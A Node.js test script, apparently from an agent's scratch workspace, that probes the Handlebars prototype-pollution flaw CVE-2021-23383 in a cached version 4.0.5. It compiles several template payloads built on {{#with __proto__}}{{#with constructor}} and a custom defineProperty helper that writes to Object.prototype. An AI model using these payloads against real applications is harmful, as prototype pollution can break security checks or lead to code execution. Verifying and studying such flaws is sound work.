// Test CVE-2021-23383 — fixed version
const Handlebars = require('/home/bossjy/.hermes/cache/scratch/handlebars-4.0.5.js');

console.log('Handlebars version:', Handlebars.VERSION);

// Test A: Check depthedLookup in compiled code WITH compat
console.log('\n=== Test A: precompile {{../foo}} with compat:true ===');
const codeA = Handlebars.precompile('{{../foo}}', {compat: true});
console.log('Has depthedLookup:', codeA.includes('depthedLookup'));
console.log('Has container.lookup:', codeA.includes('container.lookup'));
console.log('Full code:', codeA);

// Test B: Try lookup helper for prototype access
console.log('\n=== Test B: lookup helper ===');
const codeB = Handlebars.precompile('{{lookup "constructor.prototype" "polluted"}}');
console.log('Full code:', codeB.substring(0, 500));

// Test C: Register defineProperty helper + PoC payload
console.log('\n=== Test C: defineProperty helper + PoC ===');
Handlebars.registerHelper('defineProperty', function(prop, value) {
    try {
        Object.defineProperty(Object.prototype, prop, {value: value, writable: true, configurable: true});
        return '';
    } catch(e) {
        return 'ERROR:' + e.message;
    }
});

const payloadC = '{{#with __proto__}}{{#with constructor}}{{defineProperty "polluted" "true"}}{{/with}}{{/with}}';

// C1: WITH compat
console.log('C1 WITH compat:');
try {
    const t1 = Handlebars.compile(payloadC, {compat: true});
    const r1 = t1({});
    console.log('Result:', r1);
    console.log('Object.prototype.polluted:', Object.prototype.polluted);
} catch(e) {
    console.log('Error:', e.message);
}

delete Object.prototype.polluted;

// C2: WITHOUT compat
console.log('C2 WITHOUT compat:');
try {
    const t2 = Handlebars.compile(payloadC);
    const r2 = t2({});
    console.log('Result:', r2);
    console.log('Object.prototype.polluted:', Object.prototype.polluted);
} catch(e) {
    console.log('Error:', e.message);
}

delete Object.prototype.polluted;

// Test D: Try prototype pollution via with + lookup (read)
console.log('\n=== Test D: with __proto__ + lookup (read) ===');
const payloadD = '{{#with __proto__}}{{#with constructor}}{{lookup "prototype" "polluted"}}{{/with}}{{/with}}';
try {
    const t3 = Handlebars.compile(payloadD);
    const r3 = t3({});
    console.log('Result:', r3);
} catch(e) {
    console.log('Error:', e.message);
}

// Test E: Try with+each for prototype access
console.log('\n=== Test E: with constructor + each ===');
const payloadE = '{{#with __proto__}}{{#with constructor}}{{#each prototype}}{{@key}}{{/each}}{{/with}}{{/with}}';
try {
    const t4 = Handlebars.compile(payloadE);
    const r4 = t4({});
    console.log('Result (first 200):', r4.substring(0, 200));
} catch(e) {
    console.log('Error:', e.message);
}

// Test F: Direct depthedLookup exploit (if the path contains injection chars)
console.log('\n=== Test F: depthedLookup path injection ===');
// Try path with special characters that might break the string
const tests = [
    '{{../foo}}',
    '{{../../foo}}',
    '{{this/foo}}',
    '{{../[foo]}}',  // literal path part
];
for (const t of tests) {
    try {
        const code = Handlebars.precompile(t, {compat: true});
        const hasDepthed = code.includes('depthedLookup') || code.includes('container.lookup');
        console.log(`${t} -> depthedLookup/container.lookup: ${hasDepthed}`);
        if (hasDepthed) {
            // Find the relevant code
            const idx = code.indexOf('depths[') >= 0 ? code.indexOf('depths[') : code.indexOf('container.lookup');
            console.log('  Code:', code.substring(idx, idx + 200));
        }
    } catch(e) {
        console.log(`${t} -> Error: ${e.message}`);
    }
}

console.log('\n=== Final: Object.prototype.polluted:', Object.prototype.polluted);
